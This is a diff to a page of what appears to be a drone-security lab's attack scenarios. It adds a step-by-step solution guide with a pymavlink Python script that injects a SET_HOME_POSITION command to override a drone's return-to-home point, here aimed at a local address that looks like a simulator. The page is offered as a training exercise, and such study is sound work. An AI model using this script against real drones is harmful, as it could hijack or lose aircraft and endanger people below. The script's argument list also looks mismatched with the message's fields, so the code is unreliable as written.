@@ -1,19 +1,68 @@
-title: Return-to-Home Override
-description: Scenario Under development
+title: Return to Home Point Override
+description: Override the Return to Home (RTH) point of the drone using pymavlink.
 breadcrumb:
   - text: Attack Scenarios
     link: /attacks
   - text: Injection
-  - text: Return-to-Home Override
+  - text: Change Return to Home Point
 
 sections:
   - title: Description
     content: |
-      <span class="alert-warning">🚧 Scenario Under development</span>
+      Changing the Return to Home (RTH) point of a drone involves sending the `SET_HOME_POSITION` command to update the coordinates used by the drone for its RTH feature. This guide demonstrates how to achieve this using pymavlink.
 
   - title: Resources
-    content: []
+    content:
+      - text: pymavlink
+        link: https://pypi.org/project/pymavlink/
 
   - title: Solution Guide
     collapsible: true
-    steps: []
+    steps:
+      - title: Step 1
+        description: | 
+          Install pymavlink.
+
+          ```bash
+          pip install pymavlink
+          ```
+
+      - title: Step 2
+        description: | 
+          Create a Python script to set the new home position. Replace `connection_string`, `latitude`, `longitude`, and `altitude` with appropriate values.
+
+          ```python
+          from pymavlink import mavutil
+
+          # Replace with your connection string
+          connection_string = 'udp:127.0.0.1:14550'
+
+          # Connect to the vehicle
+          master = mavutil.mavlink_connection(connection_string)
+          master.wait_heartbeat()
+
+          # Define the new home position (latitude, longitude, altitude)
+          latitude = -35.363261  # Degrees
+          longitude = 149.165230  # Degrees
+          altitude = 584  # Meters
+
+          # Convert latitude and longitude to 1E7 scaled integers
+          lat = int(latitude * 1e7)
+          lon = int(longitude * 1e7)
+          alt = int(altitude * 1000)  # Altitude in millimeters
+
+          # Send SET_HOME_POSITION command
+          master.mav.set_home_position_send(
+              master.target_system,
+              lat, lon, alt,
+              0, 0, 0,  # Not used
+              0, 0, 0,  # Not used
+              0, 0  # Not used
+          )
+
+          print(f"Home position set to: lat={latitude}, lon={longitude}, alt={altitude}")
+          ```
+
+      - title: Conclusion
+        description: |
+         This guide provides a step-by-step approach to changing the Return to Home (RTH) point using pymavlink, allowing you to override the home position coordinates of your drone.
